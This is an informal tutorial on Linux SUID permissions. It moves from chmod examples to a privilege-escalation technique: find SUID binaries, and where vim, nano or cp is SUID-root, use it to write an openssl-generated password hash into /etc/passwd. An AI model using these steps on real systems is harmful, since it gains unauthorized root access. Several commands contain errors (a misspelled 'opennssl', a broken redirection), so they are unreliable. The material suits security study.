Now, I explain how a non-root user can change his own password when he does not have write permission to /etc/shadow file.

SUID (Set owner User ID up on execution) is a special type of file permission given to a file, inherit access permission from the logged in user. In simple word user will get file owner permission as well as owner UID and GID when executing a `file/program/command`. 

I have a bit right here:

```bash
-rwsr-xr-x 1 root root 6820 28 06:37 /usr/bin/passwd
```

And this `s` mean here that every body or every user, every logged in user so since i am logged in, that is able to execute this user login password. Here, rather than `x`, we have `s`.

Two way that can do this:
- Symbolic way:

```bash 
chmod u+s <file-name>
```

- Numerical way:

```bash
chmod 4750 <file-name>
```

>Read = 4
>Write = 2
>Execute = 1

Can find all file have type `s`

```bash
find / -type f -perm -u=s 2><file-name>
```

If the result is `/usr/bin/vim.basic` and you list the file with `ls -l`, you will see:

```bash
-rwsr-xr-x 1 root root 2906824 22 05:12 /usr/bin/vim.basic
```

This means I should be able to run Vim with root privileges.

Then use `openssl` to generate an encrypted-password from the plaintext password.

```bash
opennssl passwd -1 <plaintext-password>
```

And final paste `encrypted-password` in `/etc/passwd` and use this for logged in.

> Instead of `vim.basic`, it could also be `nano` or `cp`
